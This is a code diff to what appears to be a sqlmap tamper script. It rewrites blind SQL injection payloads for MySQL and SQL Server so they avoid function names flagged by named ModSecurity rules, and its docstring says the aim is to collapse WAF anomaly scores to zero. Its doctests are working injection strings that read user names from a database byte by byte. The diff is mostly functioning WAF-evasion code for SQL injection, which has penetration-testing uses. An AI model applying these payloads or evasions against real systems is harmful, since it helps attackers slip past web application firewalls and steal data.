@@ -28,6 +28,30 @@ def _balancedEnd(payload, start):
         idx += 1
     return -1
 
+def _unwrapIsnull(query):
+    """Rewrites sqlmap's MySQL NULL wrapper 'IFNULL(<x>,<y>)' into '(IF(<x> IS NULL,<y>,<x>))'."""
+    retVal = query
+
+    while True:
+        match = re.search(r"(?i)IFNULL\(", retVal)
+
+        if not match:
+            break
+
+        end = _balancedEnd(retVal, match.end() - 1)
+        if end < 0:
+            break
+
+        inner = retVal[match.end():end]
+        separator = inner.rfind(',')
+        if separator < 1:
+            break
+
+        field, default = inner[:separator], inner[separator + 1:]
+        retVal = "%s(IF(%s IS NULL,%s,%s))%s" % (retVal[:match.start()], field, default, field, retVal[end + 1:])
+
+    return retVal
+
 def _reshape(payload, opener, tail, build):
     """Replace every 'opener(<balanced query>)<tail>' with build(query, tail-match)."""
     retVal = payload
@@ -61,7 +85,7 @@ def tamper(payload, **kwargs):
     sheds the function names anomaly-scoring WAFs key on:
 
       * MySQL:      ORD(MID((<q>),<p>,1))><n>
-                 -> RIGHT(LEFT((<q>),<p>),(<p><=CHAR_LENGTH((<q>))))>BINARY 0x<nn>
+                 -> RIGHT(LEFT((<q>),<p>),(<p><=LENGTH(CONVERT((<q>) USING ascii))))>BINARY 0x<nn>
       * SQL Server: UNICODE(SUBSTRING((<q>),<p>,1))><n>   (also ASCII(SUBSTRING(...)))
                  -> CAST(RIGHT(LEFT((<q>),<p>),CASE WHEN <p><=LEN((<q>)) THEN 1 ELSE 0 END) AS VARBINARY)>0x<nn>
 
@@ -73,6 +97,10 @@ def tamper(payload, **kwargs):
           ORD/MID/ASCII/SUBSTRING/UNICODE (rule 942151) and the function-comparison shape (942190).
           LEFT/RIGHT are not in those blocklists, so the cumulative score collapses (often to 0) while
           the single-character, byte-ordered semantics of the bisection are preserved.
+        * On MySQL the character count runs over an ASCII copy of the value (one character, one byte),
+          because CHAR_LENGTH() is blacklisted by the very same rule, and the NULL wrapper IFNULL() is
+          rewritten to IF(). Counting bytes of the original instead would run past the end of a
+          multi-byte value, and a bare 'SELECT IF(' would be scored by rule 942170.
         * MySQL 'BINARY' / SQL Server '... AS VARBINARY' force a byte (case- and accent-sensitive)
           comparison, so extraction stays exact under a case-insensitive default collation. Both use a
           native hex literal (0x<nn>), so nothing needs string-escaping.
@@ -82,13 +110,15 @@ def tamper(payload, **kwargs):
           forever and never terminate.
 
     >>> tamper('1 AND ORD(MID((SELECT IFNULL(CAST(name AS NCHAR),0x20) FROM users ORDER BY id LIMIT 0,1),5,1))>71')
-    '1 AND RIGHT(LEFT((SELECT IFNULL(CAST(name AS NCHAR),0x20) FROM users ORDER BY id LIMIT 0,1),5),(5<=CHAR_LENGTH((SELECT IFNULL(CAST(name AS NCHAR),0x20) FROM users ORDER BY id LIMIT 0,1))))>BINARY 0x47'
+    '1 AND RIGHT(LEFT((SELECT (IF(CAST(name AS NCHAR) IS NULL,0x20,CAST(name AS NCHAR))) FROM users ORDER BY id LIMIT 0,1),5),(5<=LENGTH(CONVERT((SELECT (IF(CAST(name AS NCHAR) IS NULL,0x20,CAST(name AS NCHAR))) FROM users ORDER BY id LIMIT 0,1) USING ascii))))>BINARY 0x47'
     >>> tamper('1 AND ORD(MID((SELECT 1),1,1))>0')
-    '1 AND RIGHT(LEFT((SELECT 1),1),(1<=CHAR_LENGTH((SELECT 1))))>BINARY 0x00'
+    '1 AND RIGHT(LEFT((SELECT 1),1),(1<=LENGTH(CONVERT((SELECT 1) USING ascii))))>BINARY 0x00'
+    >>> tamper('1 AND ORD(MID((SELECT 1),1,1)) IN (65,66,0)')
+    "1 AND BINARY RIGHT(LEFT((SELECT 1),1),(1<=LENGTH(CONVERT((SELECT 1) USING ascii)))) IN (0x41,0x42,'')"
     >>> tamper('1 AND 5141=5141')
     '1 AND 5141=5141'
     >>> tamper('1 AND ORD(MID((SELECT 1),1,1))<65')
-    '1 AND RIGHT(LEFT((SELECT 1),1),(1<=CHAR_LENGTH((SELECT 1))))<BINARY 0x41'
+    '1 AND RIGHT(LEFT((SELECT 1),1),(1<=LENGTH(CONVERT((SELECT 1) USING ascii))))<BINARY 0x41'
     >>> tamper('1 AND UNICODE(SUBSTRING((SELECT TOP 1 name FROM users),3,1))>64')
     '1 AND CAST(RIGHT(LEFT((SELECT TOP 1 name FROM users),3),CASE WHEN 3<=LEN((SELECT TOP 1 name FROM users)) THEN 1 ELSE 0 END) AS VARBINARY)>0x40'
     """
@@ -98,7 +128,16 @@ def tamper(payload, **kwargs):
 
     def _mysql(query, rest):
         position, operator, value = rest.group(1), rest.group(2), int(rest.group(3))
-        return "RIGHT(LEFT(%s,%s),(%s<=CHAR_LENGTH(%s)))%sBINARY 0x%02x" % (query, position, position, query, operator, value)
+        query = _unwrapIsnull(query)
+        return "RIGHT(LEFT(%s,%s),(%s<=LENGTH(CONVERT(%s USING ascii))))%sBINARY 0x%02x" % (query, position, position, query, operator, value)
+
+    def _mysqlSet(query, rest):
+        # set-membership form of the same read ('... IN (<ordinals>)', used by the Huffman retrieval).
+        # ORD('') is 0, so a past-the-end position matches the ordinal 0, which is the empty string here
+        position, ordinals = rest.group(1), [int(_) for _ in rest.group(2).split(',')]
+        query = _unwrapIsnull(query)
+        members = ",".join("''" if _ == 0 else "0x%02x" % _ for _ in ordinals)
+        return "BINARY RIGHT(LEFT(%s,%s),(%s<=LENGTH(CONVERT(%s USING ascii)))) IN (%s)" % (query, position, position, query, members)
 
     def _mssql(query, rest):
         position, operator, value = rest.group(1), rest.group(2), int(rest.group(3))
@@ -109,6 +148,12 @@ def tamper(payload, **kwargs):
         return "CAST(RIGHT(LEFT(%s,%s),CASE WHEN %s<=LEN(%s) THEN 1 ELSE 0 END) AS VARBINARY)%s0x%02x" % (query, position, position, query, operator, value)
 
     comma_tail = r"\s*,\s*(\d+)\s*,\s*1\)\)\s*(>=|<=|>|<|=)\s*(\d+)"
-    retVal = _reshape(payload, r"(?i)ORD\(MID\(", comma_tail, _mysql)
+    set_tail = r"\s*,\s*(\d+)\s*,\s*1\)\)\s+IN\s*\(([\d,\s]+)\)"
+
+    if re.search(r"(?i)IFNULL\(", payload):        # also on payloads that are not single-character reads
+        payload = _unwrapIsnull(payload)
+
+    retVal = _reshape(payload, r"(?i)ORD\(MID\(", set_tail, _mysqlSet)
+    retVal = _reshape(retVal, r"(?i)ORD\(MID\(", comma_tail, _mysql)
     retVal = _reshape(retVal, r"(?i)(?:UNICODE|ASCII)\(SUBSTRING\(", comma_tail, _mssql)
     return retVal
